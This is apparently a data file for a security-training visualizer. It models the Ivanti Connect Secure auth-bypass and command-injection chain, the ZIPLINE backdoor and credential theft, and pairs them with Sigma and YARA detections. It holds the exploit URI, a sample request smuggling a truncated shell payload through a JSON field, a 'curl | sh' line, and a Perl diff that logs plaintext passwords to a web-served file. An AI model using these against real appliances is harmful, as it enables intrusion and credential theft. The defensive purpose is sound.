import type { AttackScenario } from '../types';

export const scenario: AttackScenario = {
  id: 'splunk-ivanti-connect-secure',
  code: 'CVE-2024-21887',
  name: 'Splunk STRT & Mandiant — Ivanti Connect Secure (UNC5221): Auth Bypass, RCE & ZIPLINE Backdoor',
  shortSubtitle: 'Splunk STRT / Mandiant UNC5221 · CVE-2023-46805 + CVE-2024-21887, libdsupgrade.so ZIPLINE & CAV Tamper',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Analyzed extensively by the Splunk Threat Research Team (STRT), Mandiant (UNC5221), and Volexity (UTA0178), attackers chained an authentication bypass via path traversal (CVE-2023-46805) with an administrative command injection flaw (CVE-2024-21887) in Ivanti Connect Secure VPN appliances. UNC5221 deployed the ZIPLINE passive ELF backdoor by trojanizing /home/lib/libdsupgrade.so, modified /home/perl/DSLog.pm to steal plaintext VPN passwords, and patched the built-in Integrity Checker (cav-0.1-py2.7.egg) to hide modifications.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Splunk Threat Research Team (ESCU) & Mandiant UNC5221 ZIPLINE Analysis',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (CVE-2023-46805 / CVE-2024-21887) · T1574.006 (ZIPLINE Shared Lib) · T1556 (DSLog.pm)',
    },
    {
      term: 'BACKDOOR ARTIFACT',
      value: 'ZIPLINE (/home/lib/libdsupgrade.so Hooked into /home/bin/web) & Wirefilter.py',
    },
    {
      term: 'EXPLOIT URI CHAIN',
      value: '/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection',
    },
  ],
  nodes: [
    {
      id: 'unc5221_actor',
      label: 'UNC5221 / UTA0178 Actor',
      sublabel: '198.51.100.145 (Zero-Day Operator)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'China-Nexus Espionage Cluster (UNC5221)',
        pidOrPort: 'HTTPS :443 -> Ivanti Connect Secure REST API',
        privilege: 'Unauthenticated External',
        artifacts: [
          'URI: /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection',
          'Trigger String: "I5033248" (ZIPLINE Magic Header)',
        ],
        description:
          'UNC5221 threat actor chaining CVE-2023-46805 path traversal with CVE-2024-21887 JSON command injection.',
      },
    },
    {
      id: 'ivanti_vpn_gateway',
      label: 'Ivanti Connect Secure VPN',
      sublabel: '172.16.12.10 (/home/bin/web)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Ivanti Connect Secure (Pulse Connect Secure Linux)',
        pidOrPort: 'Process: /home/bin/web & REST API Server',
        privilege: 'root (UID 0)',
        artifacts: [
          '/home/perl/DSLog.pm (Modified for Credential Harvesting)',
          '/home/venv3/lib/python3.6/site-packages/cav-0.1-py2.7.egg (Tampered Integrity Checker)',
        ],
        description:
          'Enterprise SSL-VPN appliance where the REST API command injection executes arbitrary shell commands as root.',
      },
    },
    {
      id: 'zipline_elf_backdoor',
      label: 'ZIPLINE Passive Backdoor',
      sublabel: '/home/lib/libdsupgrade.so (Hooked accept)',
      role: 'memory',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Trojanized ELF Shared Library (ZIPLINE)',
        pidOrPort: 'Loaded by /home/bin/web · Hooks accept/read',
        privilege: 'Appliance Root Memory',
        artifacts: [
          'Checks inbound socket buffer for magic string "I5033248"',
          'Provides Reverse Tunnel, File Upload/Download & Proxy',
        ],
        description:
          'Passive ELF backdoor implanted inside /home/lib/libdsupgrade.so that intercepts network sockets inside /home/bin/web when it sees the magic header "I5033248".',
      },
    },
    {
      id: 'corp_vpn_sessions',
      label: 'Active Directory & VPN Sessions',
      sublabel: '10.10.0.0/16 (Plaintext Auth & Pivot)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Internal Corporate Network & AD',
        pidOrPort: 'Harvested DSID Cookies & Plaintext Passwords',
        privilege: 'VPN Authenticated Users & Admins',
        artifacts: [
          'Stolen Plaintext Credentials from Modified DSLog.pm',
          'Internal SMB / RDP Lateral Pivoting via ZIPLINE Proxy',
        ],
        description:
          'Internal enterprise servers reached using plaintext VPN credentials harvested by the trojanized Perl login handler.',
      },
    },
    {
      id: 'splunk_escu_siem',
      label: 'Splunk Enterprise Security (STRT)',
      sublabel: 'Web Access Logs & External ICT Scanner',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Splunk SIEM running STRT ESCU Detections',
        pidOrPort: 'Ivanti Syslog, Suricata & External ICT',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Splunk ESCU: Ivanti Connect Secure Auth Bypass CVE-2023-46805',
          'YARA: Mandiant_ZIPLINE_ELF_Backdoor',
        ],
        description:
          'Runs Splunk Threat Research Team (STRT) analytics detecting /api/v1/totp/user-backup-code/../../ path traversal and ZIPLINE indicators.',
      },
    },
  ],
  processTree: [
    {
      pid: 1412,
      ppid: 1,
      name: 'python3 (Ivanti REST API)',
      commandLine: '/home/venv3/bin/python3 /home/restservice/rest_server.py',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'cloud_server_test_connection()',
        'subprocess.Popen("; curl ... | sh", shell=True)',
      ],
    },
    {
      pid: 2048,
      ppid: 1,
      name: '/home/bin/web (ZIPLINE Hook)',
      commandLine: '/home/bin/web (Loads trojanized /home/lib/libdsupgrade.so)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'dlopen("/home/lib/libdsupgrade.so")',
        'read(fd, buf, 8) -> memcmp(buf, "I5033248", 8)',
      ],
      memoryBlocks: [
        {
          address: '0x00007F8C20100000',
          section: '/home/lib/libdsupgrade.so (ZIPLINE)',
          permissions: 'R-X',
          size: '72 KB',
          status: 'injected',
          description:
            'Trojanized libdsupgrade.so loaded into /home/bin/web inspecting incoming SSL-VPN connections for magic string I5033248.',
          hexPreview: '7F 45 4C 46 02 01 01 00 49 35 30 33 33 32 34 38',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'PATH TRAVERSAL AUTH BYPASS & RCE (CVE-2023-46805 + CVE-2024-21887)',
      subtitle: 'Chaining /api/v1/totp/user-backup-code/../../ with cloud-server-test-connection',
      description:
        'As documented by Splunk STRT and Mandiant, the attacker requests /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection. The ../.. traversal bypasses authentication (CVE-2023-46805), and shell metacharacters inside the JSON "type" parameter trigger root command execution (CVE-2024-21887).',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['unc5221_actor', 'ivanti_vpn_gateway', 'splunk_escu_siem'],
      compromisedNodeIds: ['ivanti_vpn_gateway'],
      keySpecs: [
        { term: 'AUTH BYPASS', value: 'CVE-2023-46805 (/api/v1/totp/user-backup-code/../../)' },
        { term: 'COMMAND INJECTION', value: 'CVE-2024-21887 (cloud-server-test-connection JSON "type")' },
        { term: 'PRIVILEGE', value: 'Unauthenticated Remote Root Execution (UID 0)' },
      ],
    },
    {
      index: 2,
      title: 'ZIPLINE ELF BACKDOOR IN LIBDSUPGRADE.SO & CAV TAMPERING',
      subtitle: 'Replacing /home/lib/libdsupgrade.so and neutralizing the internal Integrity Checker',
      description:
        'UNC5221 remounts the filesystem read-write and replaces /home/lib/libdsupgrade.so with the ZIPLINE passive ELF backdoor. Loaded into /home/bin/web, ZIPLINE waits for incoming connections beginning with the ASCII magic string "I5033248". Simultaneously, the attacker modifies cav-0.1-py2.7.egg so the built-in Integrity Checker Tool (ICT) reports 0 modified files.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1574.006',
      mitreTechniqueName: 'Hijack Execution Flow: Dynamic Linker Hijacking',
      activeNodeIds: ['ivanti_vpn_gateway', 'zipline_elf_backdoor', 'splunk_escu_siem'],
      compromisedNodeIds: ['ivanti_vpn_gateway', 'zipline_elf_backdoor'],
      keySpecs: [
        { term: 'PASSIVE BACKDOOR', value: 'ZIPLINE (/home/lib/libdsupgrade.so in /home/bin/web)' },
        { term: 'MAGIC TRIGGER', value: 'ASCII Header "I5033248" on TCP 443' },
        { term: 'DEFENSE EVASION', value: 'Patches cav-0.1-py2.7.egg to spoof clean ICT scan results' },
      ],
    },
    {
      index: 3,
      title: 'DSLOG.PM CREDENTIAL HARVESTING & INTERNAL TUNNELING',
      subtitle: 'Intercepting plaintext VPN logins and proxying into Active Directory',
      description:
        'By injecting Perl code into /home/perl/DSLog.pm and CompCheckResult.cgi, the attacker captures plaintext Active Directory credentials as users log into the VPN and uses ZIPLINE as a SOCKS proxy to move laterally into the corporate network.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1556',
      mitreTechniqueName: 'Modify Authentication Process',
      activeNodeIds: ['zipline_elf_backdoor', 'corp_vpn_sessions', 'unc5221_actor', 'splunk_escu_siem'],
      compromisedNodeIds: ['ivanti_vpn_gateway', 'zipline_elf_backdoor', 'corp_vpn_sessions'],
      keySpecs: [
        { term: 'MODIFIED PERL', value: '/home/perl/DSLog.pm & /home/webserver/htdocs/dana-na/auth/compcheckresult.cgi' },
        { term: 'STOLEN DATA', value: 'Plaintext AD Usernames, Passwords & Session Cookies' },
        { term: 'MANDIANT CLUSTER', value: 'UNC5221 (Zero-Day Espionage Actor)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'spl-iv-1',
      no: 1,
      stageIndex: 1,
      timestamp: '03:41:09.120',
      sourceNodeId: 'unc5221_actor',
      targetNodeId: 'ivanti_vpn_gateway',
      sourceLabel: '198.51.100.145',
      targetLabel: 'Ivanti VPN :443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Splunk ESCU / Suricata',
      shortAction: 'CVE-2024-21887 RCE',
      info: 'POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection',
      sizeOrCode: 'HTTP 200',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Splunk Threat Research Team (STRT) detection rule matches the /api/v1/totp/user-backup-code/../../ path traversal chained with cloud-server-test-connection.',
      rawLog: `POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection HTTP/1.1
Host: 172.16.12.10
Content-Type: application/json

{"type": ";python3 -c 'import socket,subprocess,os; ...';", "txtGCPProject": "a", "txtGCPSecret": "a", "txtGCPPath": "a", "txtGCPBucket": "a"}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Splunk STRT — Ivanti Connect Secure Auth Bypass & RCE (CVE-2023-46805 / CVE-2024-21887)',
        ruleCode: `title: Ivanti Connect Secure Path Traversal and Command Injection
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/api/v1/totp/user-backup-code/../../'
      - '/api/v1/cav/client/status/../../'
      - 'cloud-server-test-connection'
  condition: selection
level: critical`,
        mitigation:
          'Apply Ivanti Connect Secure patches, run the external Integrity Checker Tool (ICT), and factory-reset any appliance showing signs of compromise.',
      },
    },
    {
      id: 'spl-iv-2',
      no: 2,
      stageIndex: 2,
      timestamp: '03:41:14.702',
      sourceNodeId: 'ivanti_vpn_gateway',
      targetNodeId: 'zipline_elf_backdoor',
      sourceLabel: '/home/bin/web',
      targetLabel: '/home/lib/libdsupgrade.so',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'Mandiant YARA ZIPLINE',
      shortAction: 'ZIPLINE ELF HOOK',
      info: 'Trojanized /home/lib/libdsupgrade.so loaded in /home/bin/web checking for magic string "I5033248"',
      sizeOrCode: '72 KB ELF',
      severity: 'CRITICAL',
      mitreId: 'T1574.006',
      explanation:
        'Mandiant documented that ZIPLINE intercepts read() inside /home/bin/web and activates its covert C2 handler when it receives the 8-byte string "I5033248".',
      rawLog: `[EXTERNAL_ICT_SNAPSHOT_DIFF]
Modified ELF Shared Object: /home/lib/libdsupgrade.so
Expected SHA256: 2c81a9f0...
Actual SHA256:   e94b107c... (MATCH: Mandiant_Backdoor_Linux_ZIPLINE)
Modified Python Egg: /home/venv3/lib/python3.6/site-packages/cav-0.1-py2.7.egg
Embedded String: "I5033248", "/tmp/data/root/etc/ld.so.preload"`,
      detectionRule: {
        type: 'YARA',
        title: 'Mandiant Official YARA — M_Hunting_Backdoor_ZIPLINE_1',
        ruleCode: `rule Mandiant_Backdoor_Linux_ZIPLINE {
  meta:
    author = "Mandiant"
    description = "Detects ZIPLINE passive ELF backdoor in libdsupgrade.so"
  strings:
    $magic = "I5033248" ascii
    $path1 = "/tmp/data/root/home/lib/libdsupgrade.so" ascii
    $path2 = "send_file_to_server" ascii
  condition:
    uint32(0) == 0x464C457F and ($magic or ($path1 and $path2))
}`,
        mitigation:
          'Use only the external, boot-time Integrity Checker Tool (ICT) rather than the internal web UI scanner (which UNC5221 patches via cav-0.1-py2.7.egg).',
      },
    },
    {
      id: 'spl-iv-3',
      no: 3,
      stageIndex: 3,
      timestamp: '03:45:29.880',
      sourceNodeId: 'zipline_elf_backdoor',
      targetNodeId: 'corp_vpn_sessions',
      sourceLabel: '/home/perl/DSLog.pm',
      targetLabel: 'compcheckresult.cgi',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'File Integrity Alert',
      shortAction: 'DSLOG.PM CRED STEAL',
      info: 'Modified /home/perl/DSLog.pm writing plaintext VPN credentials to /home/webserver/htdocs/dana-na/',
      sizeOrCode: 'Cred Harvest',
      severity: 'CRITICAL',
      mitreId: 'T1556',
      explanation:
        'UNC5221 modifies Perl authentication modules on the Ivanti appliance to log every user and administrator password in plaintext.',
      rawLog: `[FILE_INTEGRITY_DIFF] /home/perl/DSLog.pm
+ open(my $fh, '>>', '/home/webserver/htdocs/dana-na/css/ds_cache.css');
+ print $fh encode_base64("$user:$password:$realm\\n");
+ close($fh);`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Ivanti Connect Secure Unauthenticated Access to Static CSS/CGI Dropzone',
        ruleCode: `title: Suspicious Webshell / Credential Drop Access on Ivanti Dana-NA Path
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains:
      - '/dana-na/auth/compcheckresult.cgi'
      - '/dana-na/css/'
    sc-status: 200
  condition: selection
level: high`,
        mitigation:
          'Revoke all active VPN sessions, rotate all LDAP/RADIUS bind account passwords, and reset credentials for all users who authenticated through the appliance.',
      },
    },
  ],
};
